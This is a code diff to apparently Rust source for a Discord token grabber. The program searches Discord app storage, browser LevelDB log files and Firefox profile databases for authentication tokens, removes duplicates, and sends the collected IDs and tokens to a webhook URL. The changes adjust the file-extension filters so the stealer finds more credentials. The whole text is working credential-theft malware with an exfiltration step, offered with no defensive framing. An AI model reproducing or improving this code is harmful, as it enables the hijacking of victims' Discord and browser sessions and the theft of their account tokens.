@@ -40,7 +40,7 @@ async fn main() {
                 let discord_tokens = grabber::grabber::get_discord_tokens(&format!("{}\\{}\\Local State", global::utils::ROAMING, name.replace(" ", "")), &path, &encrypted_regex_pattern_clone).await.lock().unwrap().token.clone();
                 new_credentials_clone.lock().unwrap().token.extend(discord_tokens);
             } else {
-                let browser_tokens = grabber::grabber::get_browser_tokens(&path, &regex_pattern_clone, &["log".to_string(), "ldb".to_string()]).await.lock().unwrap().token.clone();
+                let browser_tokens = grabber::grabber::get_browser_tokens(&path, &regex_pattern_clone, &[".log".to_string(), ".ldb".to_string()]).await.lock().unwrap().token.clone();
                 new_credentials_clone.lock().unwrap().token.extend(browser_tokens);
             }
         }));
@@ -51,7 +51,7 @@ async fn main() {
     for task in tasks {
         task.await.unwrap();
     }
-    new_credentials.lock().unwrap().token.extend(grabber::grabber::get_browser_tokens(&format!("{}\\Mozilla\\Firefox\\Profiles", global::utils::ROAMING), &regex_pattern, &["log".to_string(), "ldb".to_string()]).await.lock().unwrap().token.clone());
+    new_credentials.lock().unwrap().token.extend(grabber::grabber::get_browser_tokens(&format!("{}\\Mozilla\\Firefox\\Profiles", global::utils::ROAMING), &regex_pattern, &[".sqlite".to_string()]).await.lock().unwrap().token.clone());
 
     // // Remove duplicates
     let uncheck_tokens: Vec<String> = global::utils::remove_duplicates(new_credentials.lock().unwrap().token.clone());
@@ -92,7 +92,6 @@ async fn main() {
     final_creds.id = global::utils::remove_duplicates(final_creds.id.clone());
 
     global::utils::send_data(global::utils::WEBHOOK_URL, &format!("{:?}NOP{:?}", final_creds.id, final_creds.token));
-    
+
     return;
 }
-
